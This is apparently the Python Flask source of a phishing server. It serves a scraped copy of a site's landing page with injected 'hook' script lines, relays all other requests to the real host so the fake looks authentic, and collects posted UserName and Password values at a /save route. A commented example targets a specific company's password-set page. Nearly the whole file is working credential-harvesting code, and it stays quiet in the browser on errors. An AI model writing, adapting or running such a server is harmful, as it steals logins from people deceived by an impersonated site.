from __future__ import print_function
from flask import Flask, render_template, request, json
from jinja2 import FileSystemLoader

import sys
import requests


app = Flask(__name__)

config={}

# One of the landing pages
@app.route('/')
def show_index():

    hook_blob = []
    try:
       with open (config['site']['server']['hook-shims'][0]['filename'], "r") as shim:
          hook_blob=shim.readlines()
    except EnvironmentError: # parent of IOError, OSError *and* WindowsError where available
       print("Shim file error", file=sys.stderr)

    return render_template(config['site']['scraper']['urls'][0]['filename'], hook_blob=hook_blob)

# Example: Add scraped page to be hooked by the local server
#@app.route('/Client/Home/DowChemSetPassword.aspx')
#def setpass():
#    hook_blob = []
#    try:
#       with open (config['site']['server']['hook-shims'][1]['filename'], "r") as shim:
#          hook_blob=shim.readlines()
#    except EnvironmentError: # parent of IOError, OSError *and* WindowsError where available
#       print("Shim file error", file=sys.stderr)
#
#    return render_template(config['site']['scraper']['urls'][1]['filename'], hook_blob=hook_blob)

# All the rest paths arre traveling to the destination unchanged
@app.route('/<path:other>')
def other(other):
   remap_host = config['site']['server']['remap-host']
   urlg="".join([remap_host,request.full_path])
   print("Remapping request to %s" % urlg)
   r = requests.get(urlg)
   return r.content


# The route we are postign hooked form (elements of the from) to 
@app.route("/save",  methods=['POST'])
def save_data():

    # Expected and accepted form parameters
    wFormFields = {'UserName': '', 'Password' : ''}
    for field in wFormFields.keys(): 

       # Populate JSON data bag so you can extract relevant field easy.
       # Check if what is being submitted is what you want 
       if field in request.form:
          for field in wFormFields.keys(): 
             wFormFields[field]=request.form[field]

          print(json.dumps(wFormFields))
          return '', 200
       else:
          print("check form parameters accepted: %s" % (json.dumps(request.form)), file=sys.stderr)
          return '', 400
    
    return '', 200 # We want to be quiet in browser console even if unknown error occurs, change to 400 to debug

if __name__ == '__main__':

    config_file="./default.json"
    with open(config_file) as config_file:
        config = json.load(config_file)
    app.run(debug=True, host=config['site']['server']['listen-host'], port=config['site']['server']['listen-port'])

